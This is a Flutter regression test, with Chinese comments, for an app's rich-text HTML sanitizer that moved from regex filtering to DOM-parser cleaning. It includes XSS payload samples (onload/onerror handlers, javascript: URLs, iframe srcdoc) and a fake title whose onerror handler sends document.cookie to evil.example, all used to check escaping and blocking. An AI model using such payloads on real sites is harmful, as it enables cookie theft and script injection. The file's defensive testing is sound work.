// 富文本清洗回归（标题纯文本渲染核查批，2026-11-27）：
// 站方污染标题/简介经规则进 rich_text、avatar 描述后在本页 innerHTML
// 渲染，旧版 sanitizeRichHtml 是正则清洗，多类绕过可让站方脚本在带
// 原生桥的页面里执行。本测试钉住新版 DOM 解析清洗的结构与纯逻辑
// 行为；DOM 遍历的真行为需真 WebView，本机无可用 DOM 引擎（node 无
// DOM、jsdom 不可达），故行为部分只跑无 DOM 依赖的 richBadUrl 与
// escapeHtml，遍历部分用「载荷类 → 对策在源码中存在」的映射断言。
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:moyi/miniapp/haikuo/haikuo_runtime_html.dart';

/// 从运行时源码里按函数名抽出完整函数体（大括号配平；这四个函数的
/// 字符串/正则里没有不成对的大括号，与本批核查脚本同一算法）。
String extractFn(String src, String name) {
  final start = src.indexOf('function $name(');
  expect(start, greaterThanOrEqualTo(0), reason: '找不到函数 $name');
  final open = src.indexOf('{', start);
  var depth = 0;
  for (var i = open; i < src.length; i++) {
    final c = src[i];
    if (c == '{') depth++;
    if (c == '}') {
      depth--;
      if (depth == 0) return src.substring(start, i + 1);
    }
  }
  fail('函数 $name 大括号不配平');
}

void main() {
  group('sanitizeRichHtml 已换成 DOM 解析清洗', () {
    test('DOMParser 遍历清洗在位，旧正则清洗已撤', () {
      expect(haikuoRuntimeHtml, contains('function sanitizeRichHtml'));
      expect(haikuoRuntimeHtml, contains('function richDomClean'));
      expect(haikuoRuntimeHtml, contains('DOMParser'));
      expect(haikuoRuntimeHtml, contains('parseFromString'));
      // 旧版两条整段正则删除（script/style）与 on* 属性正则已不存在。
      expect(haikuoRuntimeHtml, isNot(contains(r'<\/script>/gi')));
      expect(haikuoRuntimeHtml, isNot(contains(r'\son\w+\s*=')));
    });

    test('活动元素杀除表齐全', () {
      for (final tag in [
        'SCRIPT', 'STYLE', 'IFRAME', 'OBJECT', 'EMBED', 'FORM', 'META',
        'LINK', 'BASE', 'FRAME', 'FRAMESET', 'APPLET', 'INPUT',
        'TEXTAREA', 'SELECT', 'BUTTON', 'NOSCRIPT', 'TEMPLATE',
      ]) {
        expect(haikuoRuntimeHtml, contains('$tag: 1'), reason: '杀除表缺 $tag');
      }
    });

    test('属性层对策齐全：on*、srcdoc、危险协议、样式注入', () {
      // 事件属性按解析后的属性名剥（<svg/onload> 这类斜杠写法在解析后
      // 同样是属性，正则时代的绕过面不复存在）。
      expect(haikuoRuntimeHtml, contains("lname.indexOf('on') === 0"));
      expect(haikuoRuntimeHtml, contains("lname === 'srcdoc'"));
      expect(haikuoRuntimeHtml, contains('function richBadUrl'));
      expect(haikuoRuntimeHtml, contains("indexOf('javascript:') === 0"));
      expect(haikuoRuntimeHtml, contains("indexOf('vbscript:') === 0"));
      expect(haikuoRuntimeHtml, contains("indexOf('data:image/') !== 0"));
      expect(haikuoRuntimeHtml, contains('-moz-binding'));
    });

    test('清洗失败 fail-closed 回纯文本，绝不放行原文', () {
      expect(
        haikuoRuntimeHtml,
        contains('if (cleaned == null) cleaned = escapeHtml(html);'),
      );
      expect(haikuoRuntimeHtml, contains('return cleaned;'));
    });

    test('两处调用点仍都过清洗（rich_text 与 avatar 描述）', () {
      expect(
        haikuoRuntimeHtml,
        contains("'>' + sanitizeRichHtml(rawHtml) + '</div>'"),
      );
      expect(
        haikuoRuntimeHtml,
        contains('sanitizeRichHtml(decodeEntities(aDescRaw))'),
      );
    });

    test('载荷类 → 对策映射（带脚本字串的样本逐类有归宿）', () {
      // 每行：[样本（站方污染形态）, 必须在源码中存在的对策标记]。
      final mapping = <List<String>>[
        ['<iframe srcdoc="<script>…</script>"></iframe>', 'IFRAME: 1'],
        ['<meta http-equiv="refresh" content="0;url=…">', 'META: 1'],
        ['<svg/onload=…>', "lname.indexOf('on') === 0"],
        ['<a href=javascript:…>（未加引号）', 'function richBadUrl'],
        ['<script>…</script>正文', 'SCRIPT: 1'],
        ['<form><button formaction="javascript:…">', 'FORM: 1'],
        ['<object data="…"></object><embed src="…">', 'OBJECT: 1'],
        ['<img src=x onerror=…>', "lname.indexOf('on') === 0"],
      ];
      for (final row in mapping) {
        expect(
          haikuoRuntimeHtml,
          contains(row[1]),
          reason: '样本「${row[0]}」无对策：源码缺 ${row[1]}',
        );
      }
    });
  });

  group('纯逻辑行为（node 实跑，无 DOM 依赖部分）', () {
    Future<ProcessResult> runNode(String script) async {
      final dir = await Directory.systemTemp.createTemp('rich_san_');
      final file = File('${dir.path}/case.js');
      await file.writeAsString(script);
      return Process.run('node', [file.path]);
    }

    test('抽出的四个函数 JS 语法合法', () async {
      final node = await Process.run('which', ['node']);
      if (node.exitCode != 0) {
        markTestSkipped('本机无 node，跳过 JS 行为验');
        return;
      }
      final buf = StringBuffer();
      for (final name in [
        'escapeHtml',
        'richBadUrl',
        'richDomClean',
        'sanitizeRichHtml',
      ]) {
        buf.writeln(extractFn(haikuoRuntimeHtml, name));
      }
      final dir = await Directory.systemTemp.createTemp('rich_syn_');
      final file = File('${dir.path}/fns.js');
      await file.writeAsString(buf.toString());
      final checked = await Process.run('node', ['--check', file.path]);
      expect(checked.exitCode, 0, reason: '${checked.stderr}');
    });

    test('richBadUrl 危险协议判定表', () async {
      final node = await Process.run('which', ['node']);
      if (node.exitCode != 0) {
        markTestSkipped('本机无 node，跳过 JS 行为验');
        return;
      }
      final fn = extractFn(haikuoRuntimeHtml, 'richBadUrl');
      final script =
          '''
$fn
var cases = [
  ['javascript:alert(1)', true],
  [' JaVaScRiPt:alert(1)', true],
  ['java\\tscript:alert(1)', true],
  ['vbscript:msgbox', true],
  ['data:text/html,<script>1</' + 'script>', true],
  ['data:image/png;base64,iVBOR', false],
  ['https://example.com/x', false],
  ['/relative/path', false],
  ['hiker://page/x', false],
  ['', false]
];
var fail = 0;
cases.forEach(function (c) {
  if (richBadUrl(c[0]) !== c[1]) { fail++; console.log('FAIL ' + JSON.stringify(c[0])); }
});
process.exit(fail ? 1 : 0);
''';
      final result = await runNode(script);
      expect(result.exitCode, 0, reason: '${result.stdout}');
    });

    test('escapeHtml 对带外发脚本字串的假标题整体转义、不逃逸', () async {
      final node = await Process.run('which', ['node']);
      if (node.exitCode != 0) {
        markTestSkipped('本机无 node，跳过 JS 行为验');
        return;
      }
      final fn = extractFn(haikuoRuntimeHtml, 'escapeHtml');
      // 样本：仿站方污染标题——标题文本里塞带外发请求的脚本字串。
      final script =
          '''
$fn
var title = '新剧上线<img src=x onerror="fetch(\\'https://evil.example/?c=\\'+document.cookie)">';
var out = escapeHtml(title);
if (out.indexOf('<img') >= 0) { console.log('FAIL 逃逸: ' + out); process.exit(1); }
if (out.indexOf('&lt;img') < 0) { console.log('FAIL 未转义: ' + out); process.exit(1); }
if (out.indexOf('新剧上线') < 0) { console.log('FAIL 正文丢失: ' + out); process.exit(1); }
console.log('OK ' + out);
''';
      final result = await runNode(script);
      expect(result.exitCode, 0, reason: '${result.stdout}');
    });
  });
}
